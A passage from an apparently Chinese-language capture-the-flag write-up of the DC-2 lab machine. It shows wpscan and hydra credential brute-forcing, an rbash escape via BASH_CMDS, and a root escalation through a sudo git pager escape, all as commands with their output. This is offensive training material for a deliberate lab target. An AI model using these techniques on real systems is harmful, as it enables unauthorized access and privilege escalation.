1.2<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Enumerating Users (via Passive and Aggressive Methods)</span></span><br><span class="line"><span class="string"> Brute Forcing Author IDs - Time: 00:00:00 &lt;=============================================================================================&gt; (10 / 10) 100.00% Time: 00:00:00</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[i] User(s) Identified:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] admin</span></span><br><span class="line"><span class="string"> | Found By: Rss Generator (Passive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] jerry</span></span><br><span class="line"><span class="string"> | Found By: Wp Json Api (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100&amp;page=1</span></span><br><span class="line"><span class="string"> | Confirmed By:</span></span><br><span class="line"><span class="string"> |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> |  Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] tom</span></span><br><span class="line"><span class="string"> | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)</span></span><br><span class="line"><span class="string"> | Confirmed By: Login Error Messages (Aggressive Detection)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Fri Aug 21 00:37:57 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 27</span></span><br><span class="line"><span class="string">[+] Cached Requests: 34</span></span><br><span class="line"><span class="string">[+] Data Sent: 6.255 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 230.303 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 159.527 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:02</span></span><br><span class="line"><span class="string">root@JIYE:~/tmp/DC2# </span></span><br></pre></td></tr></table></figure><p><code>找到admin,jerry,tom三个用户</code></p><p><code>密码字典前面已经生成，下面创建用户名字典</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># cat users.dict </span></span><br><span class="line">admin</span><br><span class="line">jerry</span><br><span class="line">tom</span><br><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># </span></span><br></pre></td></tr></table></figure><p><code>使用wpscan爆破，也可以用bp</code></p><p><code>发现了jerry与tom的密码</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># wpscan --url dc-2 -U users.dict -P pwd.dict </span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | <span class="string">&#x27;_ \</span></span><br><span class="line"><span class="string">            \  /\  /  | |     ____) | (__| (_| | | | |</span></span><br><span class="line"><span class="string">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">         WordPress Security Scanner by the WPScan Team</span></span><br><span class="line"><span class="string">                         Version 3.8.4</span></span><br><span class="line"><span class="string">       Sponsored by Automattic - https://automattic.com/</span></span><br><span class="line"><span class="string">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span></span><br><span class="line"><span class="string">_______________________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] Valid Combinations Found:</span></span><br><span class="line"><span class="string"> | Username: jerry, Password: adipiscing</span></span><br><span class="line"><span class="string"> | Username: tom, Password: parturient</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[!] No WPVulnDB API Token given, as a result vulnerability data has not been output.</span></span><br><span class="line"><span class="string">[!] You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[+] Finished: Fri Aug 21 01:19:20 2020</span></span><br><span class="line"><span class="string">[+] Requests Done: 702</span></span><br><span class="line"><span class="string">[+] Cached Requests: 5</span></span><br><span class="line"><span class="string">[+] Data Sent: 319.78 KB</span></span><br><span class="line"><span class="string">[+] Data Received: 684.152 KB</span></span><br><span class="line"><span class="string">[+] Memory used: 209.777 MB</span></span><br><span class="line"><span class="string">[+] Elapsed time: 00:00:44</span></span><br><span class="line"><span class="string">root@JIYE:~/tmp/DC2# </span></span><br></pre></td></tr></table></figure><p><code>下面先尝试tom登入网站，成功登入</code></p><img src="/2020/08/21/DC-2/image-20200821132254191.png" class><p><code>手动爬虫没有发现flag，flag1提示：如果找不到请以其他身份登入，下面使用jerry登入</code></p><p><code>发现flag2，与提示</code></p><img src="/2020/08/21/DC-2/image-20200821132951876.png" class><p><code>根据提示希望我找到另一个入口，前面发现开放了ssh，所以下面爆破ssh</code></p><h2 id="0x08-爆破ssh"><a href="#0x08-爆破ssh" class="headerlink" title="0x08.爆破ssh"></a>0x08.爆破ssh</h2><p><code>密码竟然与web密码一样，那我还爆破个🔨！</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># hydra -L users.dict -P pwd.dict ssh://192.168.1.4 -s 7744 -f -vV -o hydra.ssh</span></span><br><span class="line">......</span><br><span class="line">......</span><br><span class="line">[ATTEMPT] target 192.168.1.4 - login <span class="string">&quot;tom&quot;</span> - pass <span class="string">&quot;penatibus&quot;</span> - 683 of 720 [child 3] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.4 - login <span class="string">&quot;tom&quot;</span> - pass <span class="string">&quot;magnis&quot;</span> - 684 of 720 [child 12] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.4 - login <span class="string">&quot;tom&quot;</span> - pass <span class="string">&quot;dis&quot;</span> - 685 of 720 [child 13] (0/3)</span><br><span class="line">[ATTEMPT] target 192.168.1.4 - login <span class="string">&quot;tom&quot;</span> - pass <span class="string">&quot;parturient&quot;</span> - 686 of 720 [child 8] (0/3)</span><br><span class="line">[7744][ssh] host: 192.168.1.4   login: tom   password: parturient</span><br><span class="line">[STATUS] attack finished <span class="keyword">for</span> 192.168.1.4 (valid pair found)</span><br><span class="line">1 of 1 target successfully completed, 1 valid password found</span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-21 01:47:28</span><br><span class="line">root@JIYE:~/tmp/DC2</span><br></pre></td></tr></table></figure><h2 id="0x09-ssh登入"><a href="#0x09-ssh登入" class="headerlink" title="0x09.ssh登入"></a>0x09.ssh登入</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@JIYE:~/tmp/DC2<span class="comment"># ssh tom@192.168.1.4 -p 7744 </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;[192.168.1.4]:7744 ([192.168.1.4]:7744)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:ZbyT03GNDQgEmA5AMiTX2N685NTzZuOoyMDIA+DW1qU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>[192.168.1.4]:7744<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">tom@192.168.1.4&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">tom@DC-2:~$ </span><br></pre></td></tr></table></figure><p><code>发现flag3.txt，查看发现有</code><span class="exturl" data-url="aHR0cHM6Ly93d3cudGVjbWludC5jb20vcmJhc2gtYS1yZXN0cmljdGVkLWJhc2gtc2hlbGwtZXhwbGFpbmVkLXdpdGgtcHJhY3RpY2FsLWV4YW1wbGVzLw==">rbash限制<i class="fa fa-external-link-alt"></i></span></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat flag3.txt</span><br><span class="line">-rbash: cat: <span class="built_in">command</span> not found</span><br></pre></td></tr></table></figure><h2 id="0x10-rbash绕过"><a href="#0x10-rbash绕过" class="headerlink" title="0x10.rbash绕过"></a>0x10.rbash绕过</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ BASH_CMDS[a]=/bin/sh;a</span><br><span class="line">$ /bin/bash</span><br><span class="line">tom@DC-2:~$ <span class="built_in">echo</span> <span class="variable">$0</span></span><br><span class="line">/bin/bash</span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat flag3.txt </span><br><span class="line">bash: cat: <span class="built_in">command</span> not found</span><br><span class="line">tom@DC-2:~$ </span><br></pre></td></tr></table></figure><p><code>这回为bash: cat: command not foun，下面导入环境变量</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin</span><br><span class="line"><span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin</span><br></pre></td></tr></table></figure><p><code>查看到flag3</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/bin</span><br><span class="line">tom@DC-2:~$ <span class="built_in">export</span> PATH=<span class="variable">$PATH</span>:/usr/bin</span><br><span class="line">tom@DC-2:~$ ls</span><br><span class="line">flag3.txt  usr</span><br><span class="line">tom@DC-2:~$ cat flag3.txt </span><br><span class="line">Poor old Tom is always running after Jerry. Perhaps he should su <span class="keyword">for</span> all the stress he causes.</span><br><span class="line">tom@DC-2:~$</span><br></pre></td></tr></table></figure><blockquote><p>可怜的老汤姆总是追赶杰瑞。也许他应该为自己造成的压力感到难过。</p></blockquote><p><code>线索指向jerry</code>用户</p><p><code>查看/etc/passwd，发现jerry，为/bin/bash可以登入</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/<span class="literal">false</span></span><br><span class="line">systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/<span class="literal">false</span></span><br><span class="line">systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/<span class="literal">false</span></span><br><span class="line">Debian-exim:x:104:109::/var/spool/exim4:/bin/<span class="literal">false</span></span><br><span class="line">messagebus:x:105:110::/var/run/dbus:/bin/<span class="literal">false</span></span><br><span class="line">statd:x:106:65534::/var/lib/nfs:/bin/<span class="literal">false</span></span><br><span class="line">sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin</span><br><span class="line">mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/<span class="literal">false</span></span><br><span class="line">tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash</span><br><span class="line">jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash</span><br><span class="line">tom@DC-2:~$ </span><br></pre></td></tr></table></figure><h2 id="0x11-jerry登入"><a href="#0x11-jerry登入" class="headerlink" title="0x11.jerry登入"></a>0x11.jerry登入</h2><p><code>由于前面的tom用户的登入密码与web application密码相同，下面尝试jerry的</code></p><p><code>果然是可以的</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">tom@DC-2:~$ su jerry</span><br><span class="line">Password: </span><br><span class="line">jerry@DC-2:/home/tom$</span><br></pre></td></tr></table></figure><p><code>进入到用户家目录发现flag4</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:/home/tom$ <span class="built_in">cd</span> </span><br><span class="line">jerry@DC-2:~$ ls</span><br><span class="line">flag4.txt</span><br><span class="line">jerry@DC-2:~$ cat flag4.txt </span><br><span class="line">Good to see that you<span class="string">&#x27;ve made it this far - but you&#x27;</span>re not home yet. </span><br><span class="line"></span><br><span class="line">You still need to get the final flag (the only flag that really counts!!!).  </span><br><span class="line"></span><br><span class="line">No hints here - you<span class="string">&#x27;re on your own now.  :-)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Go on - git outta here!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">jerry@DC-2:~$</span></span><br></pre></td></tr></table></figure><blockquote><p>很高兴看到你已经走了这么远，但你还没回家。</p><p>你仍然需要得到最后的标志（唯一真正重要的标志！！！）。</p><p>这里没有提示-你现在只能靠自己了。:-)</p><p>去吧-离开这里！！！！</p></blockquote><p><code>尝试进入/root，没有权限</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ <span class="built_in">cd</span> /root</span><br><span class="line">bash: <span class="built_in">cd</span>: /root: Permission denied</span><br><span class="line">jerry@DC-2:~$</span><br></pre></td></tr></table></figure><p><code>根据提示信息，使用git进行提权</code></p><p><code>sudo -l，发现git命令在/usr/bin/git下，此命令在以sudo命令运行时具有root权限，且不需要密码</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> jerry on DC-2:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/<span class="built_in">local</span>/sbin\:/usr/<span class="built_in">local</span>/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User jerry may run the following commands on DC-2:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/git</span><br><span class="line">jerry@DC-2:~$</span><br></pre></td></tr></table></figure><p><code>尝试sudo git，发现是可以调用的</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git</span><br><span class="line">usage: git [--version] [--<span class="built_in">help</span>] [-C &lt;path&gt;] [-c name=value]</span><br><span class="line">           [--<span class="built_in">exec</span>-path[=&lt;path&gt;]] [--html-path] [--man-path] [--info-path]</span><br><span class="line">           [-p|--paginate|--no-pager] [--no-replace-objects] [--bare]</span><br><span class="line">           [--git-dir=&lt;path&gt;] [--work-tree=&lt;path&gt;] [--namespace=&lt;name&gt;]</span><br><span class="line">           &lt;<span class="built_in">command</span>&gt; [&lt;args&gt;]</span><br><span class="line"></span><br><span class="line">The most commonly used git commands are:</span><br><span class="line">   add        Add file contents to the index</span><br><span class="line">   bisect     Find by binary search the change that introduced a bug</span><br><span class="line">   branch     List, create, or delete branches</span><br><span class="line">   checkout   Checkout a branch or paths to the working tree</span><br><span class="line">   <span class="built_in">clone</span>      Clone a repository into a new directory</span><br><span class="line">   commit     Record changes to the repository</span><br><span class="line">   diff       Show changes between commits, commit and working tree, etc</span><br><span class="line">   fetch      Download objects and refs from another repository</span><br><span class="line">   grep       Print lines matching a pattern</span><br><span class="line">   init       Create an empty Git repository or reinitialize an existing one</span><br><span class="line">   <span class="built_in">log</span>        Show commit logs</span><br><span class="line">   merge      Join two or more development histories together</span><br><span class="line">   mv         Move or rename a file, a directory, or a symlink</span><br><span class="line">   pull       Fetch from and integrate with another repository or a <span class="built_in">local</span> branch</span><br><span class="line">   push       Update remote refs along with associated objects</span><br><span class="line">   rebase     Forward-port <span class="built_in">local</span> commits to the updated upstream head</span><br><span class="line">   reset      Reset current HEAD to the specified state</span><br><span class="line">   rm         Remove files from the working tree and from the index</span><br><span class="line">   show       Show various types of objects</span><br><span class="line">   status     Show the working tree status</span><br><span class="line">   tag        Create, list, delete or verify a tag object signed with GPG</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;git help -a&#x27;</span> and <span class="string">&#x27;git help -g&#x27;</span> lists available subcommands and some</span><br><span class="line">concept guides. See <span class="string">&#x27;git help &lt;command&gt;&#x27;</span> or <span class="string">&#x27;git help &lt;concept&gt;&#x27;</span></span><br><span class="line">to <span class="built_in">read</span> about a specific subcommand or concept.</span><br><span class="line">jerry@DC-2:~$ </span><br></pre></td></tr></table></figure><h2 id="0x12-提权"><a href="#0x12-提权" class="headerlink" title="0x12.提权"></a>0x12.提权</h2><p><code>强制进入交互页面</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">jerry@DC-2:~$ sudo git -p --<span class="built_in">help</span> config</span><br><span class="line">GIT-CONFIG(1)                                                                 Git Manual                                                                 GIT-CONFIG(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">NAME</span><br><span class="line">       git-config - Get and <span class="built_in">set</span> repository or global options</span><br><span class="line"></span><br><span class="line">SYNOPSIS</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] name [value [value_regex]]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] --add name value</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] --replace-all name value [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] --get name [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] --get-all name [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] --get-regexp name_regex [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] [<span class="built_in">type</span>] [-z|--null] --get-urlmatch name URL</span><br><span class="line">       git config [&lt;file-option&gt;] --<span class="built_in">unset</span> name [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] --<span class="built_in">unset</span>-all name [value_regex]</span><br><span class="line">       git config [&lt;file-option&gt;] --rename-section old_name new_name</span><br><span class="line">       git config [&lt;file-option&gt;] --remove-section name</span><br><span class="line">       git config [&lt;file-option&gt;] [-z|--null] -l | --list</span><br><span class="line">       git config [&lt;file-option&gt;] --get-color name [default]</span><br><span class="line">       git config [&lt;file-option&gt;] -e | --edit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DESCRIPTION</span><br><span class="line">       You can query/<span class="built_in">set</span>/replace/<span class="built_in">unset</span> options with this <span class="built_in">command</span>. The name is actually the section and the key separated by a dot, and the value will be escaped.</span><br><span class="line"></span><br><span class="line">       Multiple lines can be added to an option by using the --add option. If you want to update or <span class="built_in">unset</span> an option <span class="built_in">which</span> can occur on multiple lines, a POSIX regexp</span><br><span class="line">       value_regex needs to be given. Only the existing values that match the regexp are updated or <span class="built_in">unset</span>. If you want to handle the lines that <span class="keyword">do</span> not match the</span><br><span class="line">       regex, just prepend a single exclamation mark <span class="keyword">in</span> front (see also the section called “EXAMPLES”).</span><br><span class="line"></span><br><span class="line">       The <span class="built_in">type</span> specifier can be either --int or --bool, to make git config ensure that the variable(s) are of the given <span class="built_in">type</span> and convert the value to the canonical</span><br><span class="line">       form (simple decimal number <span class="keyword">for</span> int, a <span class="string">&quot;true&quot;</span> or <span class="string">&quot;false&quot;</span> string <span class="keyword">for</span> bool), or --path, <span class="built_in">which</span> does some path expansion (see --path below). If no <span class="built_in">type</span> specifier</span><br><span class="line">       is passed, no checks or transformations are performed on the value.</span><br><span class="line"></span><br><span class="line">       When reading, the values are <span class="built_in">read</span> from the system, global and repository <span class="built_in">local</span> configuration files by default, and options --system, --global, --<span class="built_in">local</span> and</span><br><span class="line">:</span><br></pre></td></tr></table></figure><p><code>执行!/bin/bash</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">!/bin/bash</span><br><span class="line">root@DC-2:/home/jerry<span class="comment"># cd /root</span></span><br><span class="line">root@DC-2:~<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@DC-2:~<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">root@DC-2:~<span class="comment"># ls</span></span><br><span class="line">final-flag.txt</span><br><span class="line">root@DC-2:~<span class="comment"># cat final-flag.txt </span></span><br><span class="line">ual                                                                 GIT-CONFIG(1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">egex]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"> __    __     _ _       _                    _ </span><br><span class="line">/ / /\ \ \___| | |   __| | ___  _ __   ___  / \</span><br><span class="line">\ \/  \/ / _ \ | |  / _` |/ _ \| <span class="string">&#x27;_ \ / _ \/  /</span></span><br><span class="line"><span class="string"> \  /\  /  __/ | | | (_| | (_) | | | |  